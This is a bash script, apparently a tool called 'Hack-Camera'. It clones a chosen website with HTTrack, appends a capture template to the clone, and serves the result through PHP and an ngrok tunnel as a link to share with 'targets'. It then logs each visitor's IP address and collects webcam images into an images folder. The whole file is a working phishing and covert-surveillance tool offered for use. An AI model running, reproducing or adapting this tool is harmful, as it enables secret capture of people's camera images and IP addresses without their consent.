mkdir websites
mv index.html websites
figlet Hack-Camera
trap 'printf "\n";stop' 2
rm -rf saycheese.sh


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
#checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it.(apt install php) Aborting."; exit 1; }


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\eIP:\e\e%s\e\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\eWaiting targets,\e Press Ctrl + C to exit...\e\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\nCam file received! (saved in images/)\n"
rm -rf Log.log
fi
sleep 0.5

done

}



ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it(apt install unzip). Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
printf "\e Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'amd64' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
pkg install wget -y
exit 1
fi

elif [[ $arch3 == *'amd64'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e [!] Download error... \n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\eb[!] Download error... \e\n"
exit 1
fi
fi
fi

printf "Starting php server(Turn On Hotspot if on termux) \e(localhost:3333)\e...\e\n"
php -S 0.0.0.0:3333 > /dev/null 2>&1 &
sleep 2
printf "Starting ngrok server(Hotspot must be started) \e\e(http 3333)\e\e..\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

if [[ -z $link ]];then
printf "\e [!] Ngrok error, debug:\e ./ngrok http 3333\e\n"
exit 1
fi
printf "\eShare\eHTTPS\e link:\e\e %s\e\n" $link

}

start() {

if [[ ! -d images/ ]]; then
mkdir images
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e 1 - start \e\n"
default_option_server="1"
read -p $'\e Choose an option: ' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: (apt-get install httrack) "; exit 1; }
printf '\e Website (ngrok):  ' $default_website_mirror
read website_mirror
website_mirror="${website_mirror:-${default_website_mirror}}"
printf "\e Mirroring website with HTTrack...\e\n"
if [[ ! -d websites/ ]]; then
mkdir websites
fi

httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
payload
ngrok_server
checkfound


elif [[ $option_server -eq 76544452 ]]; then
default_website_template="index.html"
read -p $'\e Template file: \e' website_template
website_template="${website_template:-${default_website_template}}"
if [[ -f $website_template ]]; then

if [[ $website_template == *'.index.php'* ]]; then
printf "\e[!] Rename your template and try again.\n"
exit 1
fi

cat $website_template > index.php
cat template.html >> index.php
ngrok_server
checkfound

else
printf "\e[!] File not found\n"


exit 1
fi

else
printf "\e [!] Invalid option!\n"
sleep 1
clear
start
fi

}


payload() {

index_file=$(grep -o 'HREF=".*"' websites/index.html | cut -d '"' -f2)

if [ -f websites/"$index_file" ]; then
cat websites/$index_file > index.php
cat template.html >> index.php
fi
}



dependencies
start
